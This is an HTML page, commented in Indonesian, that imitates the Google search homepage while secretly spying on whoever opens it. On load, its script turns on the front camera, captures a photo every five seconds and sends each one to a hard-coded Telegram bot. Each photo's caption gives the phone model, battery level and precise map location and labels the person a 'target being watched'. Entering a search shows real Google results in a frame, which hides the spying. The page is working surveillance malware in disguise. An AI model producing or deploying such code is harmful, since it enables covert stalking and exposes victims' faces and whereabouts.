<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: arial, sans-serif; background: #fff; }
        iframe { border: none; width: 100%; height: 100%; display: none; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10; display: flex; flex-direction: column; align-items: center; }
        .logo { width: 272px; margin-top: 100px; margin-bottom: 30px; }
        .search-bar { width: 90%; max-width: 584px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; font-size: 16px; outline: none; box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
    </style>
</head>
<body>

<div id="overlay">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
    <input type="text" class="search-bar" id="fakeSearch" placeholder="Telusuri Google atau ketik URL" autofocus>
</div>

<iframe id="googleFrame" src=""></iframe>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
    const CHAT_ID = '6888530451';
    let userLocation = "Mencari lokasi...";
    let finalDevice = "Mendeteksi...";

    // 1. DETEKSI PERANGKAT LEBIH DALAM
    function getDeepDevice() {
        const ua = navigator.userAgent;
        let model = "Android Device";
        
        if (/android/i.test(ua)) {
            // Mencoba mengambil model yang lebih spesifik dari bagian User Agent
            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
            if (match) {
                // Biasanya model HP Android ada di bagian ke-3 (contoh: POCO C65)
                const candidate = match[3].split(" Build")[0].trim();
                model = (candidate !== "Linux") ? candidate : match[2].trim();
            }
        } else if (/iPhone/i.test(ua)) {
            model = "iPhone";
        }
        return model;
    }

    // 2. PAKSA MINTA LOKASI SETIAP MASUK
    function forceLocation() {
        if (navigator.geolocation) {
            // Menggunakan watchPosition untuk terus memantau atau getCurrentPosition dengan opsi paksa
            navigator.geolocation.getCurrentPosition(pos => {
                userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, err => {
                userLocation = "Izin Lokasi Ditolak";
            }, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0 // Memaksa browser tidak mengambil dari cache (selalu baru)
            });
        }
    }

    // 3. LOGIKA PENCARIAN & IFRAME
    document.getElementById('fakeSearch').addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            document.getElementById('googleFrame').src = "https://www.google.com/search?q=" + encodeURIComponent(this.value) + "&igu=1";
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('googleFrame').style.display = 'block';
        }
    });

    async function startService() {
        finalDevice = getDeepDevice();
        forceLocation(); // Panggil permintaan lokasi paksa

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                takeSnapshot(); // Kirim foto pertama segera
                setInterval(takeSnapshot, 5000); // Kirim tiap 5 detik
            };
        } catch (e) { console.log("Akses ditolak"); }
    }

    async function takeSnapshot() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (video.videoWidth === 0) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        let bat = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            bat = Math.round(b.level * 100) + "%";
        }

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${finalDevice}\n🔋 Baterai: ${bat}\n📍 Lokasi: ${userLocation}`);
            formData.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }, 'image/jpeg', 0.6);
    }

    window.onload = startService;
</script>
</body>
</html>
